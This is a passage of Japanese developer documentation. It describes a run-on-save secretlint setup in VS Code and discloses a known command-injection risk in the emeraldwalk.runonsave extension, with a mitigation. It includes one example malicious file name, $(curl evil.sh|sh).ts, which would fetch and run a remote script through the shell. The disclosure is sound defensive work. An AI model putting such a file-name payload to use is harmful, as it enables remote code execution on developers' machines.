...
4. **エディタによる保存時整形・表示除外・保存時検知 (Editor)**
   ...
   - **Shift-left 防御 (保存時 Secretlint):** VS Code Marketplace には `secretlint` の公式拡張機能は存在しませんが、その代替（ワークアラウンド）として `emeraldwalk.runonsave` 拡張機能を推奨し、ファイル保存時に自動で `bunx secretlint` が実行されるように設定 (`.vscode/settings.json`) しています。これにより、コミットフックや CI を待つことなく、タイピング・保存の直後にエディタ上でシークレット混入の早期フィードバックを得られる「Shift-left」なローカル防御を実現しています。
   - **既知の残存リスク（ファイル名経由のコマンドインジェクション）:** `emeraldwalk.runonsave` は `commands[].cmd` 内の `${file}` プレースホルダを単純な文字列置換で埋め込んだ後、その文字列を Node の `child_process.exec()`（シェル経由）でそのまま実行します（拡張機能本体の `ExtensionController.ts` の `getReplacements` → `doReplacement` → `exec(cfg.cmd, ...)`）。`"${file}"` のようにダブルクォートで囲んでいても、シェルはダブルクォート内でも `$(...)` やバッククォートのコマンド置換を評価するため、悪意あるファイル名（例: `$(curl evil.sh|sh).ts`）を保存対象として開くだけで、クォートを破らずに任意コマンドが実行され得ます（[CWE-94](https://cwe.mitre.org/data/definitions/94.html)）。この置換・実行はエディタ拡張機能側の実装であり、`scripts/run-secretlint-local.sh` 側でファイル名を検証する時点ではこのコマンド置換は既に完了しているため、本リポジトリの設定ファイル側からは修正できません。PRレビューやフォーク検証で信頼できないブランチをローカルにチェックアウトする場合は、そのブランチのファイルを開いて保存する前に、VS Code の拡張機能ビューから `emeraldwalk.runonsave` を（対象ワークスペースに限り）一時的に無効化することを推奨します。
